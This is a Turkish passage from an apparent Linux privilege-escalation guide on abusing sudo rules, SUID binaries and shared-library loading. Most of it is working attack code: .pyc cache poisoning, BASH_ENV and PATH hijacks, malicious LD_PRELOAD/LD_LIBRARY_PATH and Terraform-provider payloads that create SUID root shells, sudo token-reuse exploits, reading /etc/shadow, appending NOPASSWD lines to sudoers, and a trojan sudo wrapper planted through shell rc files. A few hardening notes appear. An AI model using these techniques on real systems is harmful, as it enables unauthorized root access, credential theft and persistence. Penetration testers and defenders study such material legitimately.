Çağıran, dilimlenecek `.3mf` projesini seçebiliyorsa `prusaslicer` veya `prusa-slicer` için kısıtlanmamış, root yetkisiyle çalışan bir sudo izni incelenmelidir. Bir proje, G-code dışa aktarılırken çalışan bir son işleme betiği içerebilir; özel hazırlanmış projeler, 2.6.1'e kadar PrusaSlicer üzerinden komut çalıştırabilir ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). Ayrıcalık sınırına erişilebildiği sonucuna varmadan önce etkin sudo kuralını, ikili dosyanın sürümünü ve satıcı yamalarını, proje kaynağını ve ilgili dışa aktarma yolunun çalışıp çalışmadığını doğrulayın. Sabit bir proje argümanı veya etkin bir `NOEXEC` ilkesi sonucu değiştirebilir. Slicer'ın kurulu olduğunu bulmak, tek başına bir ayrıcalık yükseltme yolunun varlığını kanıtlamaz.

### SETENV

Bu yönerge, kullanıcının bir şeyi çalıştırırken **bir ortam değişkeni ayarlamasına** izin verir:

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Bu örnek, **HTB Admirer makinesini temel alıyordu** ve script root olarak çalıştırılırken rastgele bir Python kitaplığı yüklemek için **PYTHONPATH hijacking** saldırısına karşı **savunmasızdı**:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### sudo ile çalıştırılmasına izin verilen Python içe aktarımlarında yazılabilir `__pycache__` / `.pyc` zehirleme

**sudo ile çalıştırılmasına izin verilen bir Python scripti**, paket dizininde **yazılabilir bir `__pycache__`** bulunan bir modülü içe aktarıyorsa, önbelleğe alınmış `.pyc` dosyasını değiştirebilir ve sonraki içe aktarmada ayrıcalıklı kullanıcı olarak kod çalıştırabilirsiniz.<sup>[[30]](#references)</sup>

- Nasıl çalışır:
  - CPython, bytecode önbelleklerini `__pycache__/module.cpython-<ver>.pyc` konumunda tutar.<sup>[[31]](#references)</sup>
  - Yorumlayıcı **başlığı** (kaynağa bağlı magic + zaman damgası/hash meta verileri) doğrular, ardından bu başlıktan sonra saklanan marshal edilmiş kod nesnesini çalıştırır.
  - Dizin yazılabilir olduğu için önbelleğe alınmış dosyayı **silebilir ve yeniden oluşturabilirseniz**, root’a ait ancak yazılamayan bir `.pyc` dosyası yine de değiştirilebilir.
- Tipik yol:
  - `sudo -l`, root olarak çalıştırabileceğiniz bir Python scripti veya wrapper gösterir.
  - Bu script, `/opt/app/`, `/usr/local/lib/...` gibi bir konumdan yerel bir modülü içe aktarır.
  - İçe aktarılan modülün `__pycache__` dizini kullanıcınız veya herkes tarafından yazılabilir durumdadır.

Hızlı keşif:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

Ayrıcalıklı betiği inceleyebiliyorsanız, içe aktarılan modülleri ve önbellek yollarını belirleyin:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

Kötüye kullanma iş akışı:

1. Python'ın meşru cache dosyasını oluşturması için sudo ile çalıştırılmasına izin verilen script'i bir kez çalıştırın.
2. Meşru `.pyc` dosyasının ilk 16 baytını okuyup zehirlenmiş dosyada yeniden kullanın.
3. Bir payload code object derleyin, `marshal.dumps(...)` ile serileştirin, özgün cache dosyasını silin ve özgün başlıkla birlikte kötü amaçlı bytecode'u içerecek şekilde yeniden oluşturun.
4. Import'un payload'unuzu root olarak çalıştırması için sudo ile çalıştırılmasına izin verilen script'i yeniden çalıştırın.

Önemli notlar:

- Özgün başlığı yeniden kullanmak önemlidir; çünkü Python, bytecode gövdesinin kaynak dosyayla gerçekten eşleşip eşleşmediğini değil, cache metadata'sının kaynak dosyayla eşleşip eşleşmediğini denetler.
- Bu yöntem, kaynak dosya root'a ait ve yazılamaz durumdayken, dosyayı içeren `__pycache__` dizininin yazılabilir olduğu durumlarda özellikle yararlıdır.
- `PYTHONDONTWRITEBYTECODE=1` ve `python -B`, Python'ın yeni `.pyc` dosyaları yazmasını engeller; daha önce oluşturulmuş, geçerli ve saldırgan tarafından değiştirilmiş bir cache'i yüklemesini **engellemez**. Kritik nokta, düşük ayrıcalıklı bir kullanıcının ayrıcalıklı import'un kabul edeceği bir cache'i değiştirip değiştiremeyeceğidir. Python, cache'lenmiş bytecode'u yüklemeden önce zaman damgası/boyut veya hash metadata'sını denetler. [Python import başvurusuna](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) ve [komut satırı belgelerine](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE) bakın.

Minimal proof-of-concept biçimi:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Hardening:

- Ayrıcalıklı Python import path’indeki hiçbir dizinin, `__pycache__` dahil, düşük ayrıcalıklı kullanıcılar tarafından yazılabilir olmadığından emin olun.
- Mevcut `.pyc` dosyaları dahil, cache dizinlerinin sahipliğini ve izinlerini denetleyin. Bytecode yazmayı devre dışı bırakmak yeni cache oluşturulmasını azaltabilir, ancak değiştirilebilir mevcut bir cache’i etkisiz hâle getirmez.
- Yazılabilir yerel Python modüllerini ve yazılabilir cache dizinlerini, root tarafından çalıştırılan yazılabilir shell script’leri veya paylaşılan kütüphaneler gibi değerlendirin.

### BASH_ENV, sudo env_keep aracılığıyla korunarak → root shell

sudoers `BASH_ENV` değişkenini koruyorsa (ör. `Defaults env_keep+="ENV BASH_ENV"`), izin verilen bir komutu çağırırken root olarak rastgele kod çalıştırmak için Bash’in etkileşimsiz başlangıç davranışından yararlanabilirsiniz.<sup>[[24]](#references)</sup>

- Neden işe yarar: Etkileşimsiz shell’lerde Bash, hedef script’i çalıştırmadan önce `$BASH_ENV` değişkenini değerlendirir ve bu dosyayı kaynak olarak yükler. Birçok sudo kuralı, bir script’in veya shell wrapper’ının çalıştırılmasına izin verir. `BASH_ENV` sudo tarafından korunuyorsa dosyanız root ayrıcalıklarıyla kaynak olarak yüklenir.<sup>[[23]](#references)</sup>

- Gereksinimler:
  - Çalıştırabileceğiniz bir sudo kuralı (`/bin/bash`’i etkileşimsiz olarak çağıran herhangi bir hedef veya herhangi bir bash script’i).
  - `BASH_ENV` değişkeninin `env_keep` içinde bulunması (`sudo -l` ile kontrol edin).

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Güvenliği güçlendirme:
  - `BASH_ENV`'i (`ENV`'i de) `env_keep`'ten kaldırın, `env_reset`'i tercih edin.
  - `sudo` ile izin verilen komutlarda shell wrapper'larından kaçının; minimal binary'ler kullanın.
  - Korunan env var'lar kullanıldığında `sudo` I/O logging ve alerting kullanmayı değerlendirin.

### Korunmuş HOME ile sudo üzerinden Terraform (!env_reset)

`sudo` Terraform'ın daha ayrıcalıklı bir kullanıcı olarak çalışmasına izin verdiğinde, `!env_reset` bu özel kural kapsamında hangi environment variable'ların gerçekten korunduğunu kontrol etmeniz gerektiğine dair bir ipucudur. Çağıranın yazabildiği `.terraformrc` veya `terraform.rc` dosyalarını etkin CLI yapılandırması olarak kabul etmeden önce, etkin `HOME` veya `TF_CLI_CONFIG_FILE` değerini doğrulayın. `provider_installation.dev_overrides` girdisi yalnızca sabit Terraform komutu ilgili provider'ı yüklerse ve çağıran executable dosyasını seçilen dizine yerleştirebilirse önem taşır.<sup>[[25]](#references)</sup>

- Gerekli provider'ı yazılabilir bir dizine yönlendirin ve provider'ın adını taşıyan kötü amaçlı bir plugin bırakın (örn. `terraform-provider-examples`):

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform, Go plugin el sıkışmasını başarısız kılacak ancak kapanmadan önce payload'ı root olarak çalıştırıp geride bir SUID shell bırakacaktır.

### TF_VAR geçersiz kılmaları + symlink doğrulamasını atlatma

Belirli sudo kuralı bu değişkenleri koruyorsa Terraform değişkenleri `TF_VAR_<name>` ortam değişkenleriyle sağlanabilir. Kaynak symlink'inden **okuma** için ayrıca bağlantıyı izleyen ve korumalı sonucu çağıranın okuyabileceği bir hedefe kopyalayan bir provider gerekir. Hedef symlink'ine **yazma** ise ayrı olarak çağıranın kontrolündeki bir hedef girdisi ve yazma sırasında bu bağlantıyı izleyen ayrıcalıklı bir provider gerektirir; daha sonra çalışan bir iş bunun olası sonuçlarından yalnızca biridir. Bu yollardan herhangi birini test etmeden önce `sudo -l`, `stat` ve `readlink` gibi salt okunur komutlarla sudo yetkisini, ilgili `.tf` dosyalarını, seçili CLI yapılandırmasını ve yol sahipliğini inceleyin. `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` gibi zayıf sözdizimsel doğrulamalar symlink'leri çözümlemez:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform sembolik bağlantıyı çözer ve gerçek `/root/root.txt` dosyasını saldırganın okuyabileceği bir hedefe kopyalar. Aynı yaklaşım, hedef sembolik bağlantıları önceden oluşturarak ayrıcalıklı konumlara **yazmak** için de kullanılabilir (ör. sağlayıcının hedef yolunu `/etc/cron.d/` içindeki bir konuma yönlendirmek).

### requiretty / !requiretty

Bazı eski dağıtımlarda sudo, sudo’nun yalnızca etkileşimli bir TTY’den çalışmasını zorlayan `requiretty` seçeneğiyle yapılandırılabilir. `!requiretty` ayarlanmışsa (veya seçenek yoksa), sudo reverse shells, cron jobs veya scripts gibi etkileşimli olmayan bağlamlardan çalıştırılabilir.

```bash
Defaults !requiretty
```

Bu, tek başına doğrudan bir güvenlik açığı değildir; ancak tam bir PTY gerektirmeden sudo kurallarının kötüye kullanılabileceği durumları genişletir.

### Sudo env_keep+=PATH / güvensiz secure_path → PATH hijack

`sudo -l` çıktısında `env_keep+=PATH` veya saldırganın yazabildiği girdiler içeren bir `secure_path` (ör. `/home/<user>/bin`) görünüyorsa, sudo ile çalıştırılmasına izin verilen hedef içindeki adı belirtilmemiş harici bir komut gölgelenebilir.<sup>[[3]](#references)</sup> Etkin bir `secure_path` bulunmaması da **komutun sudo ortamı çağıranın kontrolündeki bir `PATH` değerini koruyorsa** incelenmelidir; tek başına bulunmaması bunun böyle olduğunu kanıtlamaz. İzin verilen betiği çalıştırmadan okuyun; ardından tam RunAs ve argüman kuralını, etkin komut arama yolunu ve komut adıyla eşleşen, arama sırasında daha önce gelen, yazılabilir ve geçilebilir bir dizin olup olmadığını doğrulayın. Kimlik doğrulama, `NOEXEC`, shell built-in’leri ve mutlak komut yolları sonucu değiştirebilir.

- Gereksinimler: mutlak yollar kullanmadan (`free`, `df`, `ps` vb.) komutları çağıran bir betiği/ikili dosyayı çalıştıran bir sudo kuralı (genellikle `NOPASSWD`) ve önce aranan, yazılabilir bir PATH girdisi.

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Sudo çalıştırmasında yolları atlatma
Diğer dosyaları okumak veya **symlinks** kullanmak için **atlayın**. Örneğin sudoers dosyasında: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

Bir **wildcard** kullanılırsa (\*), bu daha da kolaydır:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Karşı önlemler**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Komut yolu belirtilmeden sudo komutu/SUID binary

Tek bir komuta **sudo izni** **yol belirtilmeden** verilmişse: _hacker10 ALL= (root) less_, PATH değişkenini değiştirerek bunu exploit edebilirsiniz.

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

Bu teknik, **suid** binary **bir komutu yolunu belirtmeden çalıştırıyorsa da kullanılabilir (garip bir SUID binary'nin içeriğini her zaman** _**strings**_ **ile kontrol edin)**.

[Çalıştırılacak payload örnekleri.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### Komut yolu içeren SUID binary

**suid** binary **başka bir komutu yolunu belirterek çalıştırıyorsa**, SUID dosyasının çağırdığı komutun adıyla bir **fonksiyon dışa aktarmayı** deneyebilirsiniz.

Örneğin, bir SUID binary _**/usr/sbin/service apache2 start**_ çağırıyorsa, fonksiyonu oluşturup dışa aktarmayı denemelisiniz:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Ardından, SUID binary'yi çağırdığınızda bu işlev çalıştırılır

### Özel SUID copy wrapper'ları

Kaynağı ve hedef yolları kabul eden, root sahipliğindeki bir SUID aracı iki farklı güven sınırını aşabilir. Her iki argümandan da bir shell komutu oluşturuyorsa (örneğin, `system()` işlevine oluşturulmuş bir `cp` komutu geçiriyorsa), shell metakarakterleri başka bir komutu etkin ayrıcalıklarıyla çalıştırabilir. `cp` komutunu shell kullanmadan güvenli biçimde çağırsa bile, kısıtlanmamış bir hedef `/etc/passwd` gibi dosyalara istenen içeriğin ayrıcalıklı olarak yazılmasına olanak tanıyabilir. Wrapper'ın argümanları nasıl işlediğini, effective UID davranışını, hedef kısıtlamalarını ve kopyalanan dosyanın içeriğinin çağıran tarafından belirlenip belirlenemediğini inceleyin; genel bir `cp` hatası veya tek başına SUID biti, bu yollardan herhangi birinin mümkün olduğunu kanıtlamaz. Herhangi bir manuel testten önce binary'yi ve izinlerini pasif biçimde listeleyin.

### SUID wrapper tarafından çalıştırılan yazılabilir script

Yaygın bir özel uygulama yanlış yapılandırması, root sahipliğinde bir SUID binary wrapper'ın bir script çalıştırması ve script'in düşük ayrıcalıklı kullanıcılar tarafından yazılabilir olmasıdır.

Tipik örüntü:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

Eğer `/usr/local/bin/backup.sh` yazılabilir durumdaysa, payload komutları ekleyip ardından SUID wrapper'ı çalıştırabilirsiniz:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

Hızlı kontroller:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

Bu saldırı yolu, özellikle `/usr/local/bin` içinde bulunan "bakım"/"yedekleme" wrapper'larında yaygındır.

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** ortam değişkeni, standart C kütüphanesi (`libc.so`) dahil olmak üzere diğer tüm kütüphanelerden önce yükleyici tarafından yüklenmesi gereken bir veya daha fazla paylaşımlı kütüphaneyi (.so dosyaları) belirtmek için kullanılır. Bu işlem, bir kütüphanenin önceden yüklenmesi olarak bilinir.

Ancak sistem güvenliğini korumak ve bu özelliğin, özellikle **suid/sgid** yürütülebilir dosyalarla istismar edilmesini önlemek için sistem belirli koşulları uygular:

- Gerçek kullanıcı kimliğinin (_ruid_) etkin kullanıcı kimliğiyle (_euid_) eşleşmediği yürütülebilir dosyalarda yükleyici **LD_PRELOAD** değişkenini yok sayar.
- suid/sgid özellikli yürütülebilir dosyalarda yalnızca standart yollarda bulunan ve kendileri de suid/sgid özellikli olan kütüphaneler önceden yüklenir.

`sudo` ile komut çalıştırma yetkiniz varsa ve `sudo -l` çıktısında **env_keep+=LD_PRELOAD** ifadesi yer alıyorsa ayrıcalık yükseltme mümkün olabilir. Bu yapılandırma, **LD_PRELOAD** ortam değişkeninin korunup `sudo` ile çalıştırılan komutlar tarafından tanınmasına olanak tanır ve potansiyel olarak keyfi kodun yükseltilmiş ayrıcalıklarla çalıştırılmasına yol açar.<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

Şu adla kaydedin **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Ardından **şunu kullanarak derleyin**:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Son olarak, çalıştırarak **ayrıcalıkları yükseltin**.

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> Saldırgan **LD_LIBRARY_PATH** env değişkenini kontrol ediyorsa benzer bir privesc tekniği kötüye kullanılabilir; çünkü kütüphanelerin aranacağı yolu kontrol eder.

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUID Binary – .so injection

Olağandışı görünen SUID izinlerine sahip bir binary ile karşılaşıldığında, .so dosyalarını düzgün şekilde yükleyip yüklemediğini doğrulamak iyi bir uygulamadır. Bu, aşağıdaki komut çalıştırılarak kontrol edilebilir:<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

Örneğin, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ gibi bir hatayla karşılaşmak, istismar edilebilecek bir durum olduğuna işaret eder.

Bunu istismar etmek için, aşağıdaki kodu içeren _"/path/to/.config/libcalc.c"_ adlı bir C dosyası oluşturabilirsiniz:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Bu kod, derlenip çalıştırıldığında, dosya izinlerini değiştirerek ve yükseltilmiş ayrıcalıklarla bir shell çalıştırarak ayrıcalıkları yükseltmeyi amaçlar.

Yukarıdaki C dosyasını aşağıdaki komutla bir shared object (.so) dosyasına derleyin:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

Son olarak, etkilenen SUID binary’sini çalıştırmak exploit’i tetikleyerek sistemin ele geçirilmesine yol açabilir.

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Artık yazabildiğimiz bir klasörden kütüphane yükleyen bir SUID binary bulduğumuza göre, gerekli ada sahip kütüphaneyi bu klasörde oluşturalım:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Şöyle bir hata alırsanız:

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

that means that the library you have generated needs to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) Unix ikililerinin, bir saldırganın yerel güvenlik kısıtlamalarını aşmak için istismar edebileceği işlevlerini derleyen bir listedir. [**GTFOArgs**](https://gtfoargs.github.io/) aynısıdır, ancak bir komuta **yalnızca argüman enjekte edebildiğiniz** durumlar içindir.

Proje; kısıtlı shell'lerden çıkmak, yükseltilmiş ayrıcalıkları elde etmek veya sürdürmek, dosya aktarmak, bind ve reverse shell başlatmak ve diğer post-exploitation görevlerini kolaylaştırmak için kötüye kullanılabilecek Unix ikililerinin meşru işlevlerini toplar.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

`sudo -l` komutuna erişebiliyorsanız, herhangi bir sudo kuralını nasıl istismar edebileceğini bulup bulmadığını kontrol etmek için [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) aracını kullanabilirsiniz.

### Sudo Token'larını Yeniden Kullanma

**sudo erişiminiz** olduğu ancak parolayı bilmediğiniz durumlarda, **bir sudo komutunun çalıştırılmasını bekleyip ardından oturum token'ını ele geçirerek** ayrıcalıkları yükseltebilirsiniz.<sup>[[18]](#references)</sup>

Ayrıcalıkları yükseltmek için gerekenler:

- Zaten "_sampleuser_" kullanıcısı olarak bir shell'iniz var
- "_sampleuser_" **son 15 dakika içinde** bir şeyi çalıştırmak için `sudo` **kullanmış** (varsayılan olarak sudo token'ının süresi budur; bu token, herhangi bir parola girmeden `sudo` kullanmamızı sağlar)
- `cat /proc/sys/kernel/yama/ptrace_scope` çıktısı 0
- `gdb` erişilebilir (yükleyebilmeniz yeterlidir)

(`ptrace_scope` değerini geçici olarak `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ile etkinleştirebilir veya `/etc/sysctl.d/10-ptrace.conf` dosyasını kalıcı olarak değiştirip `kernel.yama.ptrace_scope = 0` değerini ayarlayabilirsiniz)

Tüm bu gereksinimler karşılanıyorsa, **ayrıcalıkları şu aracı kullanarak yükseltebilirsiniz:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **İlk exploit** (`exploit.sh`), _/tmp_ içinde `activate_sudo_token` ikilisini oluşturur. Bunu **oturumunuzda sudo token'ını etkinleştirmek** için kullanabilirsiniz (otomatik olarak root shell almazsınız; `sudo su` çalıştırın):

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- **İkinci exploit** (`exploit_v2.sh`), _/tmp_ içinde **root tarafından sahip olunan ve setuid biti ayarlanmış** bir sh shell oluşturur.

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- **üçüncü exploit** (`exploit_v3.sh`) **bir sudoers dosyası oluşturur**; bu dosya **sudo token'larını kalıcı hale getirir ve tüm kullanıcıların sudo kullanmasına izin verir**.

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

Klasörde veya klasör içindeki oluşturulmuş dosyalardan herhangi birinde **yazma izinleriniz** varsa, bir kullanıcı ve PID için **sudo token oluşturmak** üzere [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) binary’sini kullanabilirsiniz.\
Örneğin, _/var/run/sudo/ts/sampleuser_ dosyasının üzerine yazabiliyorsanız ve o kullanıcı olarak PID’si 1234 olan bir shell’iniz varsa, parolayı bilmenize gerek kalmadan **sudo yetkileri elde edebilirsiniz**:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

`/etc/sudoers` dosyası ve `/etc/sudoers.d` içindeki dosyalar, `sudo` kullanabilecek kişileri ve kullanım şeklini yapılandırır. Bu dosyalar **varsayılan olarak yalnızca root kullanıcısı ve root grubu tarafından okunabilir**.\
**Bu dosyayı** **okuyabilirseniz** **ilginç bilgiler edinebilirsiniz** ve herhangi bir dosyaya **yazabilirseniz** **yetki yükseltebilirsiniz**.

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

Yazabiliyorsanız bu izni kötüye kullanabilirsiniz.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

Bu izinleri kötüye kullanmanın başka bir yolu:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

OpenBSD için `doas` gibi `sudo` binary'sine alternatifler vardır. Yapılandırmasını `/etc/doas.conf` konumunda kontrol etmeyi unutmayın.

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

doas bir editöre veya yorumlayıcıya izin veriyorsa, GTFOBins tarzı kaçışları kontrol edin:

```bash
doas vim
:!/bin/sh
```

Ayrıca, orijinal Python tabanlı `dstat` için root yetkisiyle çalışabilen bir `doas` kuralı varsa eklenti yollarını da incelemek gerekir. [Kılavuzunda](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) ve [kaynak kodunda](https://github.com/dstat-real/dstat/blob/master/dstat), `dstat_*.py` eklentileri için kullanılan konumlar arasında `/usr/share/dstat/` ve `/usr/local/share/dstat/` listelenir. Mevcut kullanıcı, kurulu derlemenin gerçekten kullandığı bir konuma yazma ve arama iznine sahipse seçilen bir eklenti, `doas` RunAs kimliğiyle çalışabilir. Etkin kuralı, ilgili derlemede eklenti arama davranışını, dizin ve üst dizin izinlerini veya ACL'leri ve çağıranın eklenti seçip seçemediğini doğrulayın; tek başına bir `dstat` kuralı ya da yazılabilir bir dizin yalnızca araştırma için bir ipucudur. Diğer `dstat` uygulamaları farklı eklenti sistemleri kullanabilir. Eklenti yüklemeden meta verileri pasif olarak inceleyin.

### Sudo Hijacking

Bir **kullanıcının genellikle bir makineye bağlanıp ayrıcalıklarını yükseltmek için `sudo` kullandığını** biliyorsanız ve bu kullanıcının bağlamında bir shell elde ettiyseniz, kodunuzu root olarak ve ardından kullanıcının komutunu çalıştıracak **yeni bir sudo yürütülebilir dosyası oluşturabilirsiniz**. Ardından, kullanıcı `sudo` çalıştırdığında sizin sudo yürütülebilir dosyanızın çalışması için kullanıcının bağlamındaki **$PATH değerini değiştirin** (örneğin, `.bash_profile` dosyasına yeni yolu ekleyerek).

Kullanıcı farklı bir shell (bash dışında) kullanıyorsa yeni yolu eklemek için başka dosyaları değiştirmeniz gerektiğini unutmayın. Örneğin [sudo-piggyback](https://github.com/APTy/sudo-piggyback), `~/.bashrc`, `~/.zshrc` ve `~/.bash_profile` dosyalarını değiştirir. Başka bir örneği [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) dosyasında bulabilirsiniz.

Ya da şunun gibi bir şey çalıştırabilirsiniz:

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## Paylaşılan Kütüphane

### ld.so

`/etc/ld.so.conf` dosyası, **yüklenen yapılandırma dosyalarının nereden alındığını** belirtir. Bu dosya genellikle şu yolu içerir: `include /etc/ld.so.conf.d/*.conf`

Bu, `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyalarının okunacağı anlamına gelir. Bu yapılandırma dosyaları, **kütüphanelerin** aranacağı **diğer klasörleri gösterir**. Örneğin, `/etc/ld.so.conf.d/libc.conf` dosyasının içeriği `/usr/local/lib` şeklindedir. **Bu, sistemin kütüphaneleri `/usr/local/lib` içinde arayacağı anlamına gelir**.

Herhangi bir nedenle **bir kullanıcının** belirtilen yollardan herhangi birine yazma izni varsa — `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` içindeki herhangi bir dosyaya veya `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyasında belirtilen herhangi bir klasöre — ayrıcalıklarını yükseltebilir.\
Bu yanlış yapılandırmanın **nasıl istismar edileceğine** aşağıdaki sayfadan göz atın:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

lib dosyasını `/var/tmp/flag15/` dizinine kopyaladığınızda, program `RPATH` değişkeninde belirtildiği üzere bu konumdaki dosyayı kullanır.

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

